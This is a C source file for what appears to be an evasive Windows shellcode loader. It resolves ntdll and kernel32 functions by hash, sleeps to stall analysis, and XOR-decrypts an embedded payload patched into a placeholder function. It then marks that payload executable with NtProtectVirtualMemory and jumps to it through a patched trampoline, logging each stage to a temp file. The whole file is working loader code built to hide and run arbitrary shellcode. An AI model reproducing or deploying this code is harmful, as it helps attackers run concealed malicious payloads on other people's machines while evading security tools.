#include "APIResolve.h"

// Without this function(S) defined, we'll get  undefined reference to `___chkstk_ms' errors when compiling, so we just overwrite it.
void ___chkstk_ms()
{
    return;
}

// Also got compiler errors for missing strlen (although it's actually not used, so a dummy function here)
SIZE_T strlen(const char* _Str)
{
    return 0;
}

// We need a function, that manually does the same than strlen() does as we cannnot use that here
int __attribute__((noinline)) my_strlen(char* str)
{
	int i = 0;
	while (str[i] != '\0') {
		i++;
	}
	return i;
}

VOID __attribute__((noinline))my_memcpy(void* dest, void* src, size_t n)
{
    char* csrc = (char*)src;
    char* cdest = (char*)dest;

    for (int i = 0; i < n; i++) {
        cdest[i] = csrc[i];
    }
};




void customSleep(DWORD milliseconds) {
    uint64_t _Sleep = getFunctionPtr(HASH_KERNEL32, HASH_SLEEP);
    ((SLEEP)_Sleep)(milliseconds);
}


// we need a second function, which is capable of decrypting via a long key instead of just 0x01

void longKey()
{
    asm(".byte 0x01, 0x02, 0x03, 0x04");
}

// Another xor32 function, that takes a Pointer plus size_t as input and xors the memory

void xor32(LPVOID buf, DWORD bufSize)
{
    uint32_t* buf32 = (uint32_t*)buf;
    // xorKey is the value of LongKey() function, which is a char array. We need to convert it to uint32_t
    uint32_t xorKey = *(uint32_t*)longKey;

    uint8_t* buf8 = (uint8_t*)buf;

    size_t bufSizeRounded = (bufSize - (bufSize % sizeof(uint32_t))) / sizeof(uint32_t);
    for (size_t i = 0; i < bufSizeRounded; i++)
    {
        ((uint32_t*)buf8)[i] ^= xorKey;
    }

    for (size_t i = sizeof(uint32_t) * bufSizeRounded; i < bufSize; i++)
    {
        buf8[i] ^= (uint8_t)(xorKey & 0xFF);
    }
}


void protectdecryptAddress()
{
    asm(".byte 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88");
}

void trampoline()
{
    asm(".byte 0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xE2");
}

void shellcodeLength()
{
    asm(".byte 0xDE, 0xAD, 0x10, 0xAF");
}

void Inject()
{
    wchar_t log[] = { '\r','\n','[','*',']',' ','S','l','e','e','p','!','\0' };
    PWCHAR first = (PWCHAR)&log;
    log_to_file(first);


    customSleep(10000); 

    wchar_t log2[] = { '\r','\n','[','*',']',' ','S','l','e','e','p',' ','S','u','c','c','e','s','s','\0' };
    PWCHAR first2 = (PWCHAR)&log2;
    log_to_file(first2);


    // get back the length from the patched char array as DWORD for our decrypt function.
    DWORD shellcodelength = *( (DWORD*)shellcodeLength );

    LPVOID** pointerpointer = &protectdecryptAddress;
    LPVOID* newPointer = *pointerpointer;
    xor32(newPointer, shellcodelength);

    wchar_t log3[] = { '\r','\n','[','*',']',' ','X','o','r',' ','S','u','c','c','e','s','s','\0' };
    PWCHAR first3 = (PWCHAR)&log3;
    log_to_file(first3);

    uint64_t _NtProtectVirtualMemory = getFunctionPtr(HASH_NTDLL, HASH_NTPROTECTVIRTUALMEMORY);
    LPVOID protectAddress = protectdecryptAddress;
    DWORD protectLength = *(DWORD*)shellcodeLength;
    DWORD written;
    NTSTATUS returnValue = ((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)protectAddress, (PULONG)&protectLength, PAGE_EXECUTE_READ, &written);
    
    wchar_t log4[] = { '\r','\n','[','*',']',' ','P','r','o','t','e','c','t',' ','s','u','c','c','e','s','s','\0' };
    PWCHAR first4 = (PWCHAR)&log4;
    log_to_file(first4);

    // Afterwards, we want to JMP to this decrypted address code. We are using a trampoline for that.
    /*char trampoline[13] = {
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // mov r10, Address of our function
    0x41, 0xFF, 0xE2                                        // jmp r10
    };*/

    //void* reference = (void*)protectdecryptAddress;

    //my_memcpy(trampoline, &reference, sizeof reference); //Copy  the hook to tramp_ntcreatesection

    // directly call out trampoline code, by casting it as function pointer and calling that

    trampoline();
    //void (*trampolinePtr)() = (void (*)())trampoline;
    //trampolinePtr();

}


#define InitializeObjectAttributes( i, o, a, r, s ) {    \
      (i)->Length = sizeof( OBJECT_ATTRIBUTES );         \
      (i)->RootDirectory = r;                            \
      (i)->Attributes = a;                               \
      (i)->ObjectName = o;                               \
      (i)->SecurityDescriptor = s;                       \
      (i)->SecurityQualityOfService = NULL;              \
   }

// A logging function, that takes a char array as input and logs all provided inputs into a text file on disk. 
// This function needs to only use ntdll.dll functions, as we cannot use any other Windows APIs in this case (Process not fully initialized yet).
void __attribute__((noinline)) log_to_file(PWCHAR input) {

    uint64_t _NtCreateFile = getFunctionPtr(HASH_NTDLL, HASH_NTCREATEFILE);
    uint64_t _NtWriteFile = getFunctionPtr(HASH_NTDLL, HASH_NTWRITEFILE);
    uint64_t _RtlInitUnicodeString = getFunctionPtr(HASH_NTDLL, HASH_RTLINITUNICODESTRING);
    //uint64_t _InitializeObjectAttributes = getFunctionPtr(HASH_NTDLL, HASH_INITIALIZEOBJECTATTRIBUTES);
    uint64_t _NtClose = getFunctionPtr(HASH_NTDLL, HASH_NTCLOSE);

    // we need to create a UNICODE_STRING struct, that contains the path to the log file
    UNICODE_STRING file_path;
    wchar_t logPathString[] = { '\\', '?', '?', '\\', 'C', ':', '\\','w','i','n','d','o','w','s','\\','t','e','m','p','\\', 'l', 'o', 'g', '.', 't', 'x', 't', '\0' };
    PWCHAR logPath = (PWCHAR)&logPathString;
    ((RTLINITUNICODESTRING)_RtlInitUnicodeString)(&file_path, logPath/*L"C:\\windows\temp\log.txt"*/);

    // create a file
    HANDLE file_handle;
    IO_STATUS_BLOCK io_status;
    OBJECT_ATTRIBUTES obj_attributes;
    InitializeObjectAttributes(&obj_attributes, &file_path, 0x00000040 /*OBJ_CASE_INSENSITIVE*/, NULL, NULL);
    NTSTATUS status = ((NTCREATEFILE)_NtCreateFile)(&file_handle, FILE_ALL_ACCESS, &obj_attributes, &io_status, NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        0x00000002/*FILE_CREATE*/,
        0x00000020/*FILE_SYNCHRONOUS_IO_NONALERT*/,
        NULL,
        0);

if (status != 0) {
    status = ((NTCREATEFILE)_NtCreateFile)(&file_handle, FILE_APPEND_DATA | SYNCHRONIZE, &obj_attributes, &io_status, NULL,
        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, 3/*FILE_OPEN_IF*/, 0x00000020/*FILE_SYNCHRONOUS_IO_NONALERT*/,
        NULL,
        0);
}

// actually write into that file
UNICODE_STRING input_string;
((RTLINITUNICODESTRING)_RtlInitUnicodeString)(&input_string, input);
((NTWRITEFILE)_NtWriteFile)(file_handle, NULL, NULL, NULL, &io_status, input_string.Buffer, input_string.Length, NULL, NULL);
((NTCLOSE)_NtClose)(file_handle);
}
